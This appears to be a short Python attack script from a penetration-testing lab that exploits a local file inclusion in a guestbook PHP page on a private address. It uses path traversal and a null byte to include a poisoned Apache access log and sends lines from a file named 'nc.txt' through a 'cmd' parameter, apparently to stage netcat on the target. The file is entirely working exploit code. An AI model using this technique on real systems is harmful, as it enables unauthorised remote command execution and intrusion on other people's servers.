import requests
import re

line=''
url1='http://10.11.24.54/addguestbook.php?name=a&comment=aaaaa&cmd='
url2='&LANG=/../../../../../../../xampp/apache/logs/access.log%00Submit=Submit'

#for some reason doing this as I did in the password script caused only the start of lines to be read
with open("nc.txt", "r") as echofile:
    data = echofile.readlines()

for line in data:
    r=requests.get(url1+line+url2)
~                                                                                                                                                                                  
~                                                                                                                                                                                  
~                     
